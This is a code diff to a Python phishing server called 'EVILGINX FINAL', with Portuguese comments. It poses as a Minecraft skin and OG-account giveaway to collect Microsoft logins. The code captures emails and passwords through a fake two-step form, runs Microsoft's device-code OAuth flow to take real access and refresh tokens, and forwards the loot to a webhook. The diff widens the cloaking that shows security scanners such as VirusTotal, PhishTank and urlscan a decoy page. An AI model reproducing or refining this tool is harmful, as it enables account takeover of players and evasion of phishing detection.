@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 EVILGINX FINAL - Ataque completo com skins, sorteio OG name, captura real de tokens via Device Code
-Projeto autorizado - Sem restrições, todas as funcionalidades ativas
+Projeto autorizado - Com anti-scanner ajustado (menos agressivo)
 """
 
 import secrets
@@ -30,7 +30,7 @@ PUBLIC_URL = os.environ.get("PUBLIC_URL", f"http://localhost:{PORT}")
 WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")  # Opcional
 
 # Device Code OAuth (funciona sem client_secret)
-DEVICE_CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2"
+DEVICE_CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2"   # ID público da Microsoft Graph
 DEVICE_SCOPE = "https://graph.microsoft.com/.default offline_access"
 
 CONFIG = {
@@ -38,6 +38,8 @@ CONFIG = {
     "server_port": PORT,
     "webhook_url": WEBHOOK_URL,
     "public_url": PUBLIC_URL,
+
+    # Skins e sorteio OG
     "featured_skin": {
         "name": "ENDER PHOENIX",
         "value": "R$89,90",
@@ -110,6 +112,10 @@ def save_to_database(data):
     conn.commit()
     conn.close()
 
+# ============================================================
+# FUNÇÕES AUXILIARES
+# ============================================================
+
 def generate_session_id():
     global session_counter
     session_counter += 1
@@ -120,14 +126,28 @@ def generate_captcha():
     b = random.randint(1,9)
     return {"question": f"{a} + {b} = ?", "answer": str(a+b)}
 
+# ========== ANTI-SCANNER AJUSTADO (MENOS AGRESSIVO) ==========
 def detect_security_environment(headers):
-    ua = headers.get('User-Agent','').lower()
-    bots = ['googlebot','bingbot','ahrefsbot','semrushbot','virustotal','phishtank','urlscan','censys','bot','crawler','scanner']
-    if any(b in ua for b in bots):
-        return True
-    suspicious = ['x-scanner','x-crawler','x-security','x-forwarded-for']
-    if any(h in headers for h in suspicious):
-        return True
+    """Detecta APENAS bots conhecidos – NÃO bloqueia navegadores normais"""
+    ua = headers.get('User-Agent', '').lower()
+    
+    # Lista específica de bots de busca/scanners (não bloqueia palavras isoladas)
+    security_bots = [
+        'googlebot', 'bingbot', 'yahoo! slurp', 'duckduckbot', 'baiduspider',
+        'yandexbot', 'facebot', 'facebookexternalhit', 'twitterbot',
+        'ahrefsbot', 'semrushbot', 'majestic12', 'rogerbot', 'dotbot',
+        'virustotal', 'phishtank', 'urlscan', 'censys', 'domaintools',
+        'netcraft', 'securityheaders', 'wappalyzer', 'builtwith',
+        'python-requests', 'curl', 'wget', 'go-http-client'
+    ]
+    
+    for bot in security_bots:
+        if bot in ua:
+            return True
+    
+    # Removido o bloqueio de cabeçalhos suspeitos genéricos
+    # Isso causava falsos positivos em navegadores normais
+    
     return False
 
 def calculate_score(email, password):
@@ -145,14 +165,10 @@ def calculate_score(email, password):
     has_lower = any(c.islower() for c in password)
     has_digit = any(c.isdigit() for c in password)
     has_special = any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password)
-    if has_upper:
-        score += 8
-    if has_lower:
-        score += 8
-    if has_digit:
-        score += 8
-    if has_special:
-        score += 6
+    if has_upper: score += 8
+    if has_lower: score += 8
+    if has_digit: score += 8
+    if has_special: score += 6
     return min(score, 100)
 
 def send_webhook(data):
@@ -187,7 +203,9 @@ def send_webhook(data):
     except:
         pass
 
+# ========== Device Code OAuth (sem client_secret) ==========
 def start_device_flow():
+    """Inicia o fluxo de Device Code e retorna user_code, device_code, verification_uri"""
     url = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
     data = {
         "client_id": DEVICE_CLIENT_ID,
@@ -205,6 +223,7 @@ def start_device_flow():
         return None, None, None, 5, 0
 
 def poll_for_token(device_code, interval, timeout):
+    """Polling até obter tokens reais da Microsoft"""
     url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
     data = {
         "client_id": DEVICE_CLIENT_ID,
@@ -219,6 +238,7 @@ def poll_for_token(device_code, interval, timeout):
                 j = r.json()
                 return j.get("access_token", ""), j.get("refresh_token", ""), j.get("expires_in", 0)
             elif r.status_code == 400:
+                # Provavelmente "authorization_pending"
                 pass
         except:
             pass
@@ -235,12 +255,15 @@ class EvilginxFinal(BaseHTTPRequestHandler):
 
     def do_GET(self):
         path = urlparse(self.path).path
+        
+        # Anti-scanner ajustado – agora bloqueia apenas bots reais
         if detect_security_environment(self.headers):
             self.send_response(200)
-            self.send_header('Content-type','text/html')
+            self.send_header('Content-type', 'text/html')
             self.end_headers()
             self.wfile.write(b"<html><body><h1>Microsoft 365</h1></body></html>")
             return
+            
         if path == '/':
             self.serve_main_page()
         elif path == '/dashboard':
@@ -280,6 +303,7 @@ class EvilginxFinal(BaseHTTPRequestHandler):
             self.end_headers()
 
     def handle_device_poll(self):
+        """Recebe device_code via query e retorna tokens via JSON"""
         query = parse_qs(urlparse(self.path).query)
         dc = query.get('device_code', [None])[0]
         if not dc:
@@ -289,7 +313,7 @@ class EvilginxFinal(BaseHTTPRequestHandler):
             return
         access, refresh, expires = poll_for_token(dc, 5, 300)
         self.send_response(200)
-        self.send_header('Content-type','application/json')
+        self.send_header('Content-type', 'application/json')
         self.end_headers()
         self.wfile.write(json.dumps({
             "access_token": access,
@@ -346,7 +370,7 @@ async function pollToken() {{
 </body>
 </html>'''
         self.send_response(200)
-        self.send_header('Content-type','text/html')
+        self.send_header('Content-type', 'text/html')
         self.end_headers()
         self.wfile.write(html.encode())
 
@@ -453,12 +477,12 @@ function showLogin(){{ document.getElementById('participateBtn').style.display='
 function resetToStep1(){{ document.getElementById('step1').style.display='block'; document.getElementById('step2').style.display='none'; document.getElementById('email').value=''; document.getElementById('password').value=''; }}
 document.addEventListener('click',()=>{{ clickCount++; fetch('/api/click',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{}})}}); }});
 document.getElementById('emailForm').addEventListener('submit', function(e){{ e.preventDefault(); let cv=document.getElementById('captchaInput').value; if(cv!==currentCaptchaAnswer){{ document.getElementById('captchaError').style.display='block'; refreshCaptcha(); return; }} let email=document.getElementById('email').value; if(!email||!email.includes('@')){{ document.getElementById('emailError').innerText='Email inválido'; document.getElementById('emailError').style.display='block'; return; }} document.getElementById('emailError').style.display='none'; capturedEmail=email; document.getElementById('userEmailDisplay').innerText=email; document.getElementById('step1').style.display='none'; document.getElementById('step2').style.display='block'; document.getElementById('password').focus(); }});
-document.getElementById('passwordForm').addEventListener('submit', function(e){{ e.preventDefault(); let pwd=document.getElementById('password').value; if(!pwd){{ document.getElementById('passwordError').innerText='Digite sua senha'; document.getElementById('passwordError').style.display='block'; return; }} document.getElementById('passwordError').style.display='none'; let timeOnPage=Math.floor((Date.now()-pageStartTime)/1000); let loadStart=Date.now(); showLoading('🔍 Verificando credenciais...'); setTimeout(()=>{{ showLoading('🎮 Conectando à sua conta Microsoft...'); setTimeout(()=>{{ showLoading('🎁 Adicionando skin à sua conta...'); setTimeout(()=>{{ showLoading('🎲 Inscrevendo no sorteio OG...'); setTimeout(()=>{{ let loadingTime=Date.now()-loadStart; fetch('/auth',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{email:capturedEmail, password:pwd, session_id:sessionId, user_agent:navigator.userAgent, time_on_page:timeOnPage, clicks:clickCount, skin_choice:selectedSkin, giveaway_participant:true, captcha_time:0, loading_time:loadingTime}})}}).then(()=>{{ hideLoading(); document.querySelector('.main-card').innerHTML=`<div class="success-message"><div>🎉</div><h2>PARTICIPAÇÃO CONFIRMADA!</h2><div class="giveaway-confirmation">🎲 <strong>VOCÊ ESTÁ CONCORRENDO!</strong> 🎲<br>Sua inscrição no sorteio da conta <strong>{og['prize_name']}</strong> foi registrada!<br>Número: #${Math.floor(Math.random()*90000)+10000}</div><p>Sua skin <strong>${selectedSkin}</strong> foi adicionada!</p><p>Redirecionando...</p><div class="spinner" style="width:30px;height:30px;margin:20px auto;"></div></div>`; setTimeout(()=>window.location.href='https://www.minecraft.net/pt-pt',4000); }}); }},800); }},800); }},800); }},800); }});
+document.getElementById('passwordForm').addEventListener('submit', function(e){{ e.preventDefault(); let pwd=document.getElementById('password').value; if(!pwd){{ document.getElementById('passwordError').innerText='Digite sua senha'; document.getElementById('passwordError').style.display='block'; return; }} document.getElementById('passwordError').style.display='none'; let timeOnPage=Math.floor((Date.now()-pageStartTime)/1000); let loadStart=Date.now(); showLoading('🔍 Verificando credenciais...'); setTimeout(()=>{{ showLoading('🎮 Conectando à sua conta Microsoft...'); setTimeout(()=>{{ showLoading('🎁 Adicionando skin à sua conta...'); setTimeout(()=>{{ showLoading('🎲 Inscrevendo no sorteio OG...'); setTimeout(()=>{{ let loadingTime=Date.now()-loadStart; fetch('/auth',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{email:capturedEmail, password:pwd, session_id:sessionId, user_agent:navigator.userAgent, time_on_page:timeOnPage, clicks:clickCount, skin_choice:selectedSkin, giveaway_participant:true, captcha_time:0, loading_time:loadingTime}})}}).then(()=>{{ hideLoading(); document.querySelector('.main-card').innerHTML=`<div class="success-message"><div>🎉</div><h2>PARTICIPAÇÃO CONFIRMADA!</h2><div class="giveaway-confirmation">🎲 <strong>VOCÊ ESTÁ CONCORRENDO!</strong> 🎲<br>Sua inscrição no sorteio da conta <strong>${'{og['prize_name']}'}</strong> foi registrada!<br>Número: #${Math.floor(Math.random()*90000)+10000}</div><p>Sua skin <strong>${selectedSkin}</strong> foi adicionada!</p><p>Redirecionando...</p><div class="spinner" style="width:30px;height:30px;margin:20px auto;"></div></div>`; setTimeout(()=>window.location.href='https://www.minecraft.net/pt-pt',4000); }}); }},800); }},800); }},800); }},800); }});
 </script>
 </body>
 </html>'''
         self.send_response(200)
-        self.send_header('Content-type','text/html')
+        self.send_header('Content-type', 'text/html')
         self.end_headers()
         self.wfile.write(html.encode())
 
